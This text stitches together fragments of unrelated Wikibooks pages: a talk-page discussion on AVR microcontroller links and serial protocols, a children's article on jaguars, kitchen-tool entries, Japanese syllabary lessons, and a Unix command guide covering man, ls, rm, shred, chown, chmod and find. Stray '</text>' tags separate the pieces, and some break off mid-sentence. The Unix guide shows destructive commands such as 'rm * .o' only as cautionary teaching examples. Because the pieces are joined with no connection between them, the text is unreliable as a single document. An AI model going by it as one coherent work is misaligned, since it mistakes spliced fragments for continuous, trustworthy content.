For example, Olimex makes a lot of great protoboards and tools for the AVR, and they are specifically mentioned in the article as making a JTAG clone.  Since SparkFun Electronics stocks many Olimex products, should we put in a link to SparkFun's website?  BTW, SparkFun is in Boulder, CO, about 2 miles from where I used to work, and I've bought several things from them.  They're great folks, and if not for some serious self-control, I could spend a fortune on all the nifty stuff they carry.  Should they have a link in this article every time a product that someone else designed happens to be stocked at SparkFun?  I say no.

&lt;s&gt;So, nothing against SmileyMicros, but the wiki is not a place to advertise that you sell someone else's product.&lt;/s&gt; [[User:Pfagerburg|Pfagerburg]] ([[User talk:Pfagerburg|talk]]) 19:42, 1 February 2008 (UTC)

:OK, I admit it: I'm a living organ donor.  I donated my brain, since I seem to have so little use for it.

:It turns out I was the one that put that link to Smiley Micros in the first place, and now I remember why.  I was looking for a particular part, found it at Smiley, and in the process, noted that they stocked the Butterfly carrier board, and so added the information to the wiki.  A little more careful research at the time would have led me to the designer of the board (Ecros).  Someone (an IP addr) added the link to Ecros, and the diff brought that to my attention.

: I apologize for any confusion or offense I may have caused. [[User:Pfagerburg|Pfagerburg]] ([[User talk:Pfagerburg|talk]]) 19:54, 1 February 2008 (UTC)

== serial communication ==

I agree that this Embedded Systems book needs to talk about all kinds of serial protocols -- RS-232, RS-485, SPI, etc.
However, lots of different CPUs use these protocols.
Is there some more appropriate chapter of the Embedded Systems book to discuss serial communication in general?
That way we can avoid explaining these things over and over again, in the chapter for each specific CPU.
Or should we move most of that information to another book entirely, one on the [[serial communications bookshelf]] ?
--[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 18:09, 19 April 2008 (UTC)

I removed the circuit diagram for using a few resistors to talk to an RS-232 port.  As I had noted in the text when I first replaced the ASCII art with a proper picture, it is a poor choice for anything but a &quot;one-off&quot; system.  One thing I failed to note is that you can't use the hardware UART with this circuit; the polarity is reversed compared to what the RS-232 port expects to see.  Aside from that, it's not specific to the AVR, so if this particular circuit belongs in Wikibooks at all, a more appropriate place would be the general article on serial communication.

== Submitting your AVR project to this page ==

A few edits in the past month have been obvious self-promotion.  I'm not completely sure what to do about that in cases where there aren't many resources in the category already, or the project is in some way notable.  e.g. if someone from Kanda edited this page to mention some new debugger that they were making, I don't think I would have an issue with that.  However, I also don't want to see this page cluttered with 20 different BASIC compilers or interpreters, etc.  For right now, I'm just going to clean up the ad copy that a few people have posted, and later I will come back and see if I can tone some of this down.

You do realize that AVRFreaks has a complete list of every tool?  So you can get your stuff listed there, for free as far as I know?  It's pure supposition on my part, but I believe that when people are looking for AVR tools, they are going to look at AVRFreaks before they look at wikibooks.  But that's just my guess.

[[Image:Panthera onca.jpg|thumb|right|A spotted jaguar]]
The '''Jaguar''' is sometimes called ''Onça'' by South Americans and ''El Tigre'' (the tiger) by Central Americans.  Long ago, they called it ''Yaguara'', the &quot;cat that kills with a single spring.&quot;  Both names convey the awe and reverence this largest New World cat inspires.  Their gold coat spangled with black rosettes was said to be the stars of night.  In the Mayan religion, the sun took the form of a jaguar when travelling through the underworld at night.  Jaguars are closely related to lions, tigers, and leopards. The jaguar and leopard are almost the same but their spots are different. If you look very closely you will see that they have a different pattern. 

==Where do jaguars live?==
[[Image:jaguar range.png|thumb|left|Places where jaguars live are colored green.]]
Jaguars live in the rain forests and more open countryside in South and Central America, and are the largest members of the cat family there. Jaguars are strong swimmers and climbers, and they often prefer to live by rivers, in swamps, and in dense forest with thick cover for stalking prey.

Jaguars once lived as far north as the southwestern United States.  The last wild jaguar in the United States died around 1960.  Some of these cats are once again migrating north from Mexico.

==What do jaguars look like?==

[[Image:Black jaguar.jpg|thumb|right|A black jaguar clearly showing its darker spots]]
Jaguars look very similar to leopards, but they behave more like tigers. The jaguar has the strongest jaw structure in the cat family.  Its powerful cheek muscles and lower jaw gives the Jaguar a much more rounded face than the leopard. Jaguars are also rather short-legged compared to other cats, which increases their strength rather than their speed.

Jaguars usually have background fur that is orange-yellow in color.  There are numerous rings of spots on their flanks and spots on their heads and necks. Jaguars and leopards can be distinguished by the fact that jaguars have spots within the centers of their ring markings, while leopards do not.  Some scientific evidence suggests these two cats are very closely related but jaguars are native to the New World while leopards are native to the Old World . There are some jaguars that seem to be entirely black in color, but the spots can still be seen if you look closely. Jaguars with the all black coloring are sometimes called black panthers, but they are really jaguars.

==What do jaguars eat, and how do they catch their prey?==
Jaguars mostly take large prey, such as deer and peccaries, but they are great opportunists and will eat anything from frogs and mice to birds, fish, and domestic livestock. Jaguars can run quite quickly, but do not have much endurance and rarely make long chases.  Their strong, muscular jaws let them crush through large, thick bones and they can even crunch through a turtle's shell quickly.  This great strength allows these cats to crush the skull of prey animals rather than suffocating them with a neck bite, as most cats do. Jaguars have very good night vision and do most of their hunting on the ground at night.  They are ''nocturnal'' creatures, meaning that they prefer to be active at night.

==Fun facts==
* Jaguars will sometimes wait by the water, hitting it occasionally with their tail.  When fish are attracted by this, they swipe out with a paw, spearing the fish in their claws.

An egg separator is a tool used to separate the yolk of an egg from the egg white.

Those not wishing to purchase a device to separate their eggs for them can simply crack the egg into their hand (fingers a very tiny distance apart) and allow the egg white to slide through their fingers while the yolk remains.

Separating eggs by passing them from one half of the shell to the other is more sanitary, but can cause shards of egg shell to end up in food.</text>

== Overview ==

The Japanese written language, in its modern form, consists of: 

* [[Wiktionary:漢字|かんじ]] (''kanji'', ''Chinese characters'')
* Two syllabaries, or alphabets:
** [[Wiktionary:平仮名|ひらがな]] (''hiragana'') - the main syllabary
** [[Wiktionary:片仮名|カタカナ]] (''katakana'') - the syllabary used for borrowed words, onomotopaeia, and emphasis.
* Punctuation
* Borrowed characters, such as Arabic numberals (e.g., ''1'', ''7'', or ''0'') or roman letters (e.g., ''a'', ''b'', ''c'', etc.).

In order to learn Japanese, it is necessary to know the main Japanese syllabary, ひらがな (''hiragana''), so well that you never have to think about it.  It consists of 46 basic letters, 20 voiced letters, 33 palatal letters, and the little-つ&amp;mdash;100 letters in all.  Just below is a chart of the 46 basic letters, with romanization.  The chart should be read from right to left, in vertical columns (each of which should be read from top to bottom.  Thus the first letter is あ and the last one is ん.

This chart is referred to, in Japanese, as 五十音図 (ごじゅうおんず, gojūonzu), which literally means &quot;fifty-sounds chart&quot; (why?).  The first five letters are simply vowels, the next forty letters are consonant-vowel pairings, and the final letter, ん, is the one lone consonant in the Japanese language.  The remainder of ひらがな can be illustrated in the next two charts of derived letters.

The left five columns on the palatal chart are also voiced/half-voiced syllables.

The last letter that should be mentioned is　っ, which is the little-つ.  This is also known as [[Wiktionary:促音|促音 (そくおん)]].  Its effect is to double the length of the following consonant.  きって, for example, is romanized as ''kitte''.  Without the っ, it would become きて, which is romanized as ''kite''.

Now that we have the tools, let's discuss pronunciation before examining the ひらがな in detail.

== Vocabulary ==
Try to memorize all of the vocabulary in this section before continuing on in this book.  Every chapter will assume that you know the vocabulary from all the previous chapters.  Starting with chapter three, the vocabulary will be presented at the beginning of the chapter.  As the first two chapters present the Japanese syllabaries, it is necessary to know the material in the chapter before being able to learn the vocabulary)

Beyond this chapter the following terms will be used without explanation.  Additionally, you will be expected to use them in writing exercises.

# [[Wiktionary:平仮名|ひらがな]] - ''hiragana; the main Japanese syllabary''
# [[Wiktionary:発音|はつおん]] - ''pronunciation''
# etc.
# [[Wiktionary:味|あじ]] - ''taste; flavor''
# [[Wiktionary:色|いろ]] - ''color''
# and the rest of the words, which in combination must use all the hiragana letters.</text>

A '''grater''' is a kitchen utensil that is usually made from metal (and sometimes ceramic or even wood), with sharp perforations or protrusions used to shred food. Graters come in various sizes: from those with larger perforations which are often used to shred [[Cookbook:Cheese|cheese]] and [[Cookbook:Vegetable|vegetables]], to the very fine graters and micro planes that can be used to [[Cookbook:Zest|zest]] [[Cookbook:Citrus|citrus]] [[Cookbook:Fruit|fruit]]. Micro planes are preferred by many for their efficiency in producing finely grated food. Fresh ginger or wasabi graters are usually made from porcelain or bamboo, and use spikes or ridges to tear those fibrous rhizomes (they are not clogged with fibres like conventional graters).

A '''salad spinner''' is a tool used for removing excess water from [[Cookbook:salad|salad]] greens. 

The greens are placed in a large strainer, which fits inside a slightly larger bowl. A lid, which contains a spinning mechanism, is placed on top. The spinning mechanism causes the inside strainer to spin rapidly and usually works by repeatedly pulling a cord or pushing a button on the lid. Centrifugal force removes the excess water from the greens in the central strainer, sending it into the outer bowl.</text>

== Overview ==

In addition to ひらがな, Japanese has a second syllabary, [[Wiktionary:片仮名|カタカナ]] (''katakana''), which is used for most [[Wiktionary:外来語|がいらいご]] (''borrowed words'') and onomatopoeic or mimetic words, as well as for certain かんじ readings and as a form of emphasis (esp. in advertising and signage).

Every ひらがな letter has a カタカナ equivalent, and beyond that there are a number of additional カタカナ letters used to represent certain sounds that are not possible in traditional Japanese words.  The three charts from the first lesson ([[Wiktionary:五十音図|ごじゅうおんず]], [[Wiktionary:濁音|だくおん]]+[[Wiktionary:半濁音|はんだくおん]], and [[Wiktionary:拗音|ようおん]]) are represented just below.

===man===
'''man''' displays the manual page for the specified command

A useful option is:
 $ '''man -k TEXT'''  

This searches manual page titles and synopsis lines for TEXT

''Examples:''

To display the manual page for the chown command:

 $ '''man chown'''

'''man''' has different sections.
* section 1 is user commands
* section 2 is system calls (used by programs to communicate with the kernel)
* section 3 is library reference (for programming in C)
* section 4 is device drivers
* section 5 is configuration files and other file formats
* section 6 is games
* section 7 is miscellaneous (for example, &quot;ascii&quot; map and C &quot;operator&quot; precedence)
* section 8 is system commands (like user commands, but mostly for root)

A section number can be specified before the page name. For example, &lt;tt&gt;'''man chmod'''&lt;/tt&gt; normally shows the user command &quot;chmod&quot;. To see the system call &quot;chmod&quot;:
 $ '''man 2 chmod'''

To search the man pages for &quot;newsgroups&quot;,

 $ '''man -k newsgroups'''
 actsync              (8)  - synchronize newsgroupsoups
 newsgroups           (1)  - a program to list unsubscribed newsgroups

* If this does not work you may have to run the makewhatis command.

===info=== 
'''info'''  is an advanced man command that is sometimes available.  It displays the improved manual pages in Info format for specified command.

''Examples:'' 

To display the manual page for the grep command:

 $ '''info grep'''

To find occurrence of 'grep' in all info manual pages:

 $ '''info --apropos grep'''
 &quot;(autoconf-2.13)Examining Declarations&quot; -- EGREP_CPP
 &quot;(autoconf-2.13)Examining Declarations&quot; -- EGREP_HEADER
 &quot;(autoconf-2.13)Old Macro Names&quot; -- HEADER_EGREP
 ...

{{warning|Some copies of '''info''' lack the &quot;-w&quot; option. }}

To see the physical location of 'grep' info manual page:

 $ '''info -w grep'''
 /usr/share/info/grep.info.gz
 
To view a file a info page: 

 $ '''info -f ./some_cmd.info.gz'''

===apropos===

'''apropos''' searches the manual page short descriptions for a specified keyword

On many systems this is exactly the same as the -k option of the '''man''' command.

''Examples:''

 $ '''apropos newsgroups'''
 active               (5)  - list of active Usenet newsgroups
 newsgroups           (1)  - a program to list unsubscribed newsgroups

===whatis===
'''whatis''' displays short man page descriptions. Unlike

''Examples:''

 $ '''whatis info'''
 info (1)             - read Info documents
 info (5)             - readable online documentation

 $ '''whatis chmod'''
 chmod (1) - change file modes
 chmod, fchmod (2) - change mode of file

===makewhatis===
'''makewhatis''' creates the database for the whatis, appropos, and man -k commands.  This is commonly run automatically by your system however sometimes you need to run this manually.

''Examples:''

 # '''makewhatis'''

 $ '''sudo makewhatis'''</text>

===ls===
{{Guide to Unix/Clink|ls|1| bsds=yes| lq=yes| coreutils=52| s=LiSt contents of directory}}
'''ls''' is a utility for listing the files in a directory.

Most used options are:
; -a : all files (include files with . prefix)
; -l : long detail (provide file statistics)
; -t : order by creation time
; -u : sort by access time (or show when last accessed together with -l)
; -S : order by size
; -r : reverse order
; -F : mark directories with /, executables with *, symbolic links with @, local sockets with =, named pipes (FIFOs) with |

Other options include:
; -Fx --color : color-coded listing
; -s : show filesizes
; -h : &quot;human readble&quot;; show filesizes in kilobytes and megabytes (-h can be used together with -l or -s)

 ls *st* : list files that contain st in name
 ls &gt; list : output list to file named &quot;list&quot;
 ls | more : fit listing to screen

''Examples''
 $ '''ls'''
 fish  hello.txt

 $ '''ls -l'''
 -rw-r--r--    1 username    groupname        0 Apr 11 00:09 fish
 -rw-r--r--    1 username    groupname       11 Apr 11 00:10 hello.txt

Several systems have an alias '''ll''' which does the same as '''ls -l''':
 $ '''ll'''
 -rw-r--r--    1 username    groupname        0 Apr 11 00:09 fish
 -rw-r--r--    1 username    groupname       11 Apr 11 00:10 hello.txt

Be careful with the -F option. Here is one example:
 $ '''ls -F /usr/X11R6/bin/X*'''
 /usr/X11R6/bin/X@          /usr/X11R6/bin/Xnest*      /usr/X11R6/bin/Xprt*
 /usr/X11R6/bin/Xmark*      /usr/X11R6/bin/Xorg*       /usr/X11R6/bin/Xvfb*

We do not know yet if there is a symbolic link &quot;X&quot; and an executable &quot;Xmark&quot; or if &quot;X@&quot; and &quot;Xmark*&quot; are just the names of normal files. (Though &quot;@&quot; and &quot;*&quot; are not much found in filenames, they are possible.) So we check by dropping the -F:
 $ '''ls /usr/X11R6/bin/X*'''
 /usr/X11R6/bin/X           /usr/X11R6/bin/Xnest       /usr/X11R6/bin/Xprt
 /usr/X11R6/bin/Xmark       /usr/X11R6/bin/Xorg        /usr/X11R6/bin/Xvfb

===mkdir===

'''mkdir''' is a utility for creating a directory.

''Examples''
 $ '''mkdir newdirectoryname'''

The ''-p'' option also makes parent-directories as needed.  Instead of:
 $ '''mkdir foo'''
 $ '''cd foo'''
 $ '''mkdir bar'''

you can just do:
 $ '''mkdir -p foo/bar'''

===cd===
{{Guide to Unix/Clink| cd | lq=yes |s=change Current Directory}}
'''cd''' changes the '''c'''urrent '''d'''irectory of the shell. This current directory will be used by other programs launched from the shell.

Because &quot;cd&quot; changes the state of the shell, it is a ''shell built-in command''. In contrast, most commands are separate programs which the shell starts.

''Examples''

Change to 'foobar' directory:
 $ '''cd foobar'''

Change to your home directory, cd command used without an option will drop you back into your home directory.

 $ '''cd'''

~ (tilde) stores the path to your home directory, this command has same effect as the previous one.
 $ '''cd ~'''

Change to parent directory:
 $ '''cd ..'''

Change to the previous directory:
 $ '''cd -'''

''Tips:''

{{warning|The &quot;CDPATH&quot; might only work in some shells. For example, '''ksh''' has it.}}

By setting &quot;CDPATH&quot; environment variable in your shell you can take advantage of shell command completion facility.

 $ '''echo $CDPATH'''
 .:/usr/local:/usr/share/doc

If you have the $CDPATH set, then you press 'TAB' key and get possible path completions

 $ '''cd bas [TAB]'''
 base-config/  base-files/   base-passwd/  bash/         bastille/

===pwd===
{{Guide to Unix/Clink|pwd|1| bsds=yes | coreutils=114 | lq=yes| s=Print Working Directory}}
'''pwd''' (for Print Working Directory) shows the current directory that you are in.

Though &quot;pwd&quot; is often available as an external program (like &lt;tt&gt;/bin/pwd&lt;/tt&gt;), many shells offer an equivalent version as a shell builtin command. Like any external command, &quot;pwd&quot; would inherit the current directory from the shell or other program that starts it.

''Examples''
 $ '''pwd'''
 /home/username

You can change the directory, you can also 
 $ '''cd /usr'''
 $ '''pwd'''
 /usr

You can also use &quot;pwd&quot; in scripts. If you have enough experience with scripting, then you would know that the next line complains if the current directory is &lt;tt&gt;/home/username&lt;/tt&gt;.
 $ test &quot;x$(pwd)&quot; = x/home/username || echo wrong directory

===chroot===
{{Guide to Unix/Clink|chroot|8| bsds=yes | coreutils=145 | lq=yes | s=CHange ROOT directory}}
'''chroot''' changes the root filesystem. The [[lqwiki:chroot|&quot;chroot&quot; page]] at the Linux questions wiki explains why you might want to do this.

''Examples''

To change the root filesystem so &lt;tt&gt;/mnt/usbdrive/&lt;/tt&gt; becomes &lt;tt&gt;/&lt;/tt&gt; and files outside of it cannot be seen:
 # '''chroot /mnt/usbdrive/'''

You must be root user to &quot;chroot&quot;. Other users would be able to use &quot;chroot&quot; to gain root (superuser) privileges, so their use of &quot;chroot&quot; is disallowed.
 $ '''chroot /mnt/usbdrive/'''
 chroot: /mnt/usbdrive/: Operation not permitted

===cp=== 
'''cp''' copies a file 

Most used options are:
; -r : copies directories (recursively)
; -p : preserves permissions, ownership, and timestamps
; -i : prompt before overwrite
; -v : verbose, show filenames as they are being copied

''Examples''
 Makes a copy of file 'debian' and call it 'Debian' (assuming 'Debian' is not already a directory)
 $ '''cp -i debian Debian'''

 Makes a copy of file 'debian' and put it at /tmp/debian
 $ '''cp -i debian /tmp/debian''' 

 Same as the previous command (the filename defaults to be the same).
 $ '''cp -i debian /tmp''' 

 Makes a copy of directory 'mydir' (and all its contents) and put it at /tmp/mydir
 $ '''cp -ir mydir/ /tmp''' 

 Copy multiple files to directory /tmp
 $ '''cp -i foo bar baz /tmp''' 

{{Guide to Unix/Stub}}

===mv===
'''mv''' move and/or rename files 

''Examples'' 
 Rename file 'unix' to 'Unix' (assuming &quot;Unix&quot; is not a directory)
 $ '''mv -i unix Unix'''

 Move file Unix from your home directory to /tmp.
 $ '''mv -i ~/Unix /tmp/Unix'''

 Same as the previous command (the filename defaults to be the same).
 $ '''mv -i ~/Unix /tmp'''

 Move file Unix from your home directory to /tmp, and rename it to 'unix'.
 $ '''mv -i ~/Unix /tmp/unix'''

 Move multiple files to directory /tmp
 $ '''mv -i foo bar baz /tmp'''

{{Guide to Unix/Stub}}

===rm===
{{Guide to Unix/Clink|rm|1| bsds=yes| coreutils=68 | lq=yes| s=ReMove and delete files}}
'''rm''' deletes a file from the filesystem, like the &quot;del&quot; command in [[w:DOS|DOS]].

The GNU long options (like &lt;tt&gt;--directory&lt;/tt&gt;) are available on Linux, but not most other systems.

''Some useful options are:''
; &lt;tt&gt;-d, --directory&lt;/tt&gt; : unlink FILE, even if it is an empty directory (some systems let superuser unlink non-empty directories too)
; &lt;tt&gt;-f, --force&lt;/tt&gt; : ignore nonexistent files, never prompt
; &lt;tt&gt;-i, --interactive&lt;/tt&gt; : prompt before any removal
; &lt;tt&gt;-P&lt;/tt&gt; : (*BSD only) overwrite file before deletion
; &lt;tt&gt;-r, -R, --recursive&lt;/tt&gt; : remove the contents of directories recursively (the force option must often be used to successfully run rm recursively)
; &lt;tt&gt;-v, --verbose&lt;/tt&gt; : (GNU only) explain what is being done
; &lt;tt&gt;--help&lt;/tt&gt; : (GNU only) display help and exit
; &lt;tt&gt;--version&lt;/tt&gt; : (GNU only) output version information and exit

''Examples:''

The usage of &quot;rm&quot; is considered potentially more dangerous than equivalents in other operating systems because of the way the shell parses wildcards and names of special [[w:directory|directories]] and in its non-verbose actions.

Here is a classic example. Instead of deleting files that end with &lt;tt&gt;.o&lt;/tt&gt; (&quot;*.o&quot;) it deletes all files in the directory (&quot;*&quot;) and also a file called &lt;tt&gt;.o&lt;/tt&gt;. There is an unwanted space between the asterisk and the period.

 $ '''rm * .o'''
 rm: cannot remove `.o': No such file or directory

To remove a file whose name starts with a `-', for example `-foo',  use one of these commands:

 $ '''rm -- -foo'''

 $ '''rm ./-foo'''

It might be useful to create an alias such as &quot;remove&quot; which moves the files to a local &quot;trash&quot; file so you can go there and recover files you accidentally &quot;remove&quot;d.

''Secure deletion of files:''

Note  that  if  you  use rm to remove a file, it is usually possible to recover the contents of that file since &lt;tt&gt;rm&lt;/tt&gt; does not remove it from the [[w:hard disk|hard disk]]. It simply removes the [[w:Filesystem|filesystems]] link to it.

On *BSD systems, the -P option overwrites the data with the file before removing it.

 $ '''rm -P secretfile'''

However, as the [http://netbsd.gw.com/cgi-bin/man-cgi?rm+1 NetBSD manual page] explains it:

:''Recent research indicates that as many as 35 overwrite passes with carefully chosen data patterns may be necessary to actually prevent recovery of data from a magnetic disk.  Thus the -P option is likely both insufficient for its design purpose and far too costly for default operation.''

So while examining the data (using '''fsdb''' or making a disk image) will not reveal the secret data, other methods (such as laboratory examination of the disk) will reveal the data. In short, '''rm -P''' does not delete data securely. A program that attempts to delete data securely is GNU '''shred''', available on Linux. But &quot;shred&quot; is not always successful in secure deletion; read its entry below.

=== rmdir ===
'''rmdir''' is a utility for deleting empty directories.

''Examples''
 $ '''rmdir directoryname'''

If the directory is not empty, the correct way to remove the directory and all its contents recursively is to use
 $ '''rm -r directoryname'''

=== shred ===
{{Guide to Unix/Clink|shred|1| coreutils=69 | lq=yes | s=Attempt to securely delete files}}
'''shred''' overwrites a file multiple times with special data patterns to make the old contents of the file unrecoverable from a disk, especially a hard disk. This command is part of GNU coreutils, so it is often only available on Linux systems.

Note that this '''actually is ineffective''' on most filesystems because they can keep old copies of data. Most popular Linux filesystems (including ext3) keep such copies through journaling. However, &quot;shred&quot; is very useful for destroying the data on entire partitions or disks.

''Some useful options are:''
; -u, --remove : unlink the file after removing it
; -''NUMBER'', -n ''NUMBER'', --iterations=''NUMBER'' : the number of iterations of overwriting the file; default is 25 iterations

''Examples:''
Remove and completely destroy &lt;tt&gt;secretfile&lt;/tt&gt; from a filesystem that overwrites data in place and does not use journaling (for example, the UFS filesystem of *BSD). For the last step, after the data is destroyed, the &quot;-u&quot; option unlinks the file from the filesystem.
 $ '''shred -u secretfile'''

Note that if &lt;tt&gt;secretfile&lt;/tt&gt; has multiple hard links (with '''ln''' for example), it will continue to exist with those other names, but will contain only random data.

===touch===
'''touch''' lets you change the date on a file. Can also be used to create a blank file.

''Examples''

This will change the access date and time of ''filename'' to the current time. If ''filename'' doesn't exist it will create a blank file.
 $ '''touch filename'''

===df===
'''df''' reports the amount of free disk space available on each partition.

 $ '''df'''
 Filesystem           1K-blocks      Used Available Use% Mounted on
 /dev/md0               5763508    207380   5263352   4% /

Reports disk usage in human readable format with block-sizes in Kilo,Mega,Gigabytes.
 $ '''df -h'''

 /dev/hda1             2.3G  2.1G  133M  95% /

 /dev/hda2             2.0G  1.8G  113M  94% /usr

===ln===
'''ln''' creates links between files.

Symbolic links are special files that contain the absolute or relative path to a separate file. References to the symbolic link are &quot;forwarded&quot; to the file it (the symbolic link) points to. The file to which the reference is forwarded is not &quot;aware&quot; of the link; if the file pointed to is moved or deleted, the link will just point to nothing (no warnings are given, nor are any attempts made to &quot;refresh&quot; the link to the file's new location).

In Unix all information about files - owner, group, permissions, size, number of links, location on disk - are stored in the inode (with the notable exception of ''the filename'').  The filename is stored in directories, where inode-numbers (the way the OS refers to files) are paired with filenames (text-strings; the way ''the user'' refers to files).  The &quot;number of links&quot; entry in the inode, keeps track of how many times the inode-number has thus been paired with a name in some directory.

When creating a (hard) link with &lt;tt&gt;ln&lt;/tt&gt;, the &quot;source&quot; file is only used to determine the inode-number.  A new inode-number-to-filename entry is then made in some directory using that inode-number, and the &quot;number of links&quot; counter is incremented.  It's important that this (unlike a ''symbolic'' link) is ''the same file'' in every way... it's just that the file can be accessed by different names and/or from different locations.  Moving or deleting the &quot;original&quot; source-file has no effect on the other links.  Deleting one of the file's links only removes its entry from ''that'' directory... it's first when the ''last'' link in ''any'' directory is removed, that the file is actually deleted from the disk.

Hard links can not (unlike symbolic links) be used to refer to a file on another filesystem, nor can hard links usually be used to link to a directory.

''Examples:''

To make a soft (symbolic) link &quot;hello&quot; to the file &quot;/home/alice/code/bin/world&quot;:
 
 $ '''ln -s /home/alice/code/bin/world hello'''

To make a (hard) link from the file &quot;foo&quot; to the file &quot;bar&quot;:

 $ '''ls -l'''
 total 1
 -rw-r--r--  1  rtm  users  50  Aug 15   foo
 $ '''ln foo bar'''
 $ '''ls -l'''
 total 2
 -rw-r--r--  2  rtm  users  50  Aug 15   foo
 -rw-r--r--  2  rtm  users  50  Aug 15   bar

The 1st number of &lt;tt&gt;ls -l&lt;/tt&gt;'s listing, shows the number of (hard) links a file has - in other words, the number of times it's been entered into some directory.

===chown===
{{Guide to Unix/Clink|chown|8| bsds=yes| lq=yes| coreutils=79 | s=CHanges OWNer of file}}
'''chown''' changes the owner and group of files. Normally, only root is allowed to do this, but if a user owns a file, then that user can change the group, but only to groups containing that user. On old systems, the ability of users to give files to other users caused abuses, so most systems prohibit non-root users from changing the owner of files.

Some useful options are:
; -R : recursively change owner/group on an entire directory tree
; -h : do not follow symbolic links i.e. changes owner of the link, not the target file
; -f : indicate no errors if change failed

''Examples:''

Root changes the ownership of &quot;/etc/passwd&quot; and &quot;/etc/shadow&quot; to user root, group wheel:
 # '''chown root:wheel /etc/passwd /etc/shadow'''

The same, but only changing the owner:
 # '''chown root: /etc/{passwd,shadow}'''

The same, but only changing the group:
 # '''chown :wheel /etc/{passwd,shadow}'''

Root gives every file in &quot;/etc/ssh&quot;, including files in subdirectories, to user root, group wheel:
 # '''chown -R root:wheel /etc/ssh'''

The same, but excluding files in directories (and the invisible files &quot;/etc/ssh/.*&quot; will also be missed):
 # '''chown root:wheel /etc/ssh/*'''

User &quot;tux&quot; changes the directory &quot;/usr/local/src/xc&quot; from group &quot;tux&quot; to group &quot;wheel&quot;. Tux is a member of both groups.
 $ '''ls -ld /usr/local/src/xc'''
 drwxr-xr-x  11 tux  tux  512 Sep 30 16:19 /usr/local/src/xc
 $ '''chown tux:wheel /usr/local/src/xc'''
 $ '''ls -ld /usr/local/src/xc'''
 drwxr-xr-x  11 tux  wheel  512 Sep 30 16:19 /usr/local/src/xc

===chmod===
{{Guide to Unix/Clink|chmod|1| bsds=yes| lq=yes| coreutils=81 | s=CHanges file MODe}}
'''chmod''' changes permissions of files. One must be familiar with Unix file permissions to understand this command. There are three permissions: read (&quot;r&quot;), write (&quot;w&quot;), and execute (&quot;x&quot;). There are three sets of permissions: for the owning user of the file (&quot;u&quot;), for the group of the file (&quot;g&quot;), and for other users (&quot;o&quot;).

For a file, &quot;execute&quot; means to run it as a program. For a directory, &quot;execute&quot; permission is required to use anything in that directory tree, so doing anything with &quot;/usr/share/doc/README&quot; requires execute permissions on all of &quot;/&quot;, &quot;/usr&quot;, &quot;/usr/share&quot;, and &quot;/usr/share/doc&quot;.

If you are interested in more advanced topics like the set-uid, set-gid, sticky bits and octal numbers, try reading the FreeBSD manual page at http://www.FreeBSD.org/cgi/man.cgi (type &quot;chmod&quot; in the form and submit).

A useful option is:
; -R : recursively change or set permissions on an entire directory tree

''Examples:''

We wrote a shell script called &quot;configure&quot;. We make it executable (&quot;+x&quot;) and then execute it as a command. Usually, &quot;+x&quot; is the same as &quot;u+x&quot; or &quot;ug+x&quot;, depending on the status of the ''file mode creation mask''.
 $ '''chmod +x configure'''
 $ '''./configure'''

Allow the owning user to run &quot;configure&quot;:
 $ '''chmod u+x configure'''

Deny the group and other users from running &quot;configure&quot;:
 $ '''chmod go-x configure'''

For all users except the owner (&quot;go&quot;), disable all access to &quot;~/mail&quot; and &quot;~/private&quot; (&quot;-rwx&quot;). This way, the contents are private and only their owner (or root) can access them.
 $ '''chmod go-rwx ~/mail ~/private'''

Note that in the previous example, &quot;-R&quot; was not specified. By disabling the execute bit (&quot;-x&quot;), all files inside &lt;tt&gt;~/{mail,private}&lt;/tt&gt; are protected even if their group and other read bits are enabled. Thus, simply moving some file from inside &lt;tt&gt;~/{mail,private}&lt;/tt&gt; to some public place like &lt;tt&gt;/tmp&lt;/tt&gt; can make the files available to other users again.

The &quot;root&quot; user wants to set up &lt;tt&gt;/usr/local/src&lt;/tt&gt; so that all users in group &quot;wsrc&quot; (including &quot;tux&quot;) can create files there. Root will continue to own the directory. This is done by changing the group of &lt;tt&gt;/usr/local/src&lt;/tt&gt; to &quot;wsrc&quot; and then by granting to the group (&quot;g&quot;) the read, write, and execute permissions (&quot;+rwx&quot;).
 # '''chown :wsrc /usr/local/src'''
 # '''chmod g+rwx /usr/local/src'''

All Unix-like systems should allow all users to create temporary files in &quot;/tmp&quot; and &quot;/var/tmp&quot;. Thus root gives everyone (&quot;a&quot;, short for &quot;ugo&quot;) all permissions (&quot;+rwx&quot;) on the files.
 # '''chmod a+rwx /tmp /var/tmp'''

The problem with the above is that because all users have write access to /tmp and /var/tmp, every user can delete and rename files, even ones not created by them. For example, &quot;tux&quot; could create &quot;/tmp/socket.3908&quot; and another user could delete it or rename it to &quot;/tmp/garbage&quot;, thus annoying Tux. To keep temporary files safe, we use the ''sticky bit'' called &quot;t&quot;. This limits the deletion and renaming of files in /tmp to root, the owner of /tmp (also root), and the owner of the file (Tux for &quot;/tmp/socket.3908&quot;). It does the same for /var/tmp. So what we should do is:
 # '''chmod a+rwxt /tmp /var/tmp'''</text>

===find===
'''find''' searches a given path for a file or folder.
The syntax is: find [path...] [expression...]

''Examples:''
On some of the latest Unix-like OS's, the -print option is a default and can be omitted.  The following command searches for the file 'grub.conf' starting at the root ('/') directory.
 $ '''find / -name grub.conf'''
 /etc/grub.conf

If you are not the administrator of the computer, you get error messages for all the directories you are not allowed to read. 
In this case do it like this for a bash shell:

 $ '''find / -name grub.conf 2&gt;/dev/null'''
 /etc/grub.conf

Or like this for a csh/tcsh:

 $ '''find / -name grub.conf &gt;&amp; /dev/null'''
 /etc/grub.conf

If you want to ignore the case of the characters, you can use '''-iname'''.  The following will find files with extensions ''txt'', ''TXT'', ''Txt'', and so on:

 $ '''find / -iname '*.txt' '''
 /home/rtm/hacking.txt
 /home/bok/Documents/MyLetter.TXT
 /home/bok/tmp/found.tXt

The following command will search for all directories named 'local'.

 $ '''find / -name local -type d'''
 /usr/X11R6/lib/X11/fonts/local
 /usr/local
 /var/cache/man/local
 /var/local

The above example combined two tests - filename (-name) and filetype (-type) - and returned files satisfying both (logical AND).  

It's also possible to specify two or more tests, and return files satisfying any of them, with the '''-o''' (logical OR) directive.  The tests to be ORed must be grouped together between '''('''...''')''' (which must be escaped with '''\''' as parentheses are special to the shell).  The following return files with the extensions ''txt'' or ''doc'', as well as any file larger than 5MB (megabyte) in size.

 $ '''find / \( -name '*.txt' -o -name '*.doc' -o -size +5M \)'''
 /home/rtm/hacking.txt
 /home/bok/report.doc
 /home/bok/backup/may.tar.bz2
 /home/koppe/BiggerThan5Megs.doc

Where the last file satisfied two tests.

